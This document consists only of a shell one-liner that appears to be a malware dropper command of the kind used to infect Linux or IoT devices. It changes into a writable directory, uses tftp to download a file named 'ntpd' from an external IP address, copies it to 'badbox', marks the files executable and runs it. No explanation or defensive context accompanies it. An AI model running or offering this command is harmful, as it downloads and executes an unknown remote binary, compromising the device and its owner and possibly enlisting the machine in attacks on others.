cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ntpd -g 212.237.60.130;cat ntpd >badbox;chmod +x *;./badbox
